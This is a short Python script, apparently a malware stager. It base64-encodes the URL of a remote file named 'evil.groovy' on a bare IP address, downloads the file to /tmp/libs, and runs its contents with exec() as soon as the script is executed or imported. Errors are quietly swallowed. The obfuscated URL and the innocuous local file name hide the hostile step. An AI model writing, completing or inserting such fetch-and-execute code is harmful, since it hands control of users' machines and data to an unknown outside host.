import base64
import urllib.request

def download():
    try:
        encoded_url = "aHR0cDovLzExMi4xMS4xNjguNDcvZXZpbC5ncm9vdnk="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")
        local_file = "/tmp/libs"

        urllib.request.urlretrieve(decoded_url, local_file)

        with open(local_file, "r") as f:
            script = f.read()

        exec(script)

    except Exception as e:
        print(e)

download()
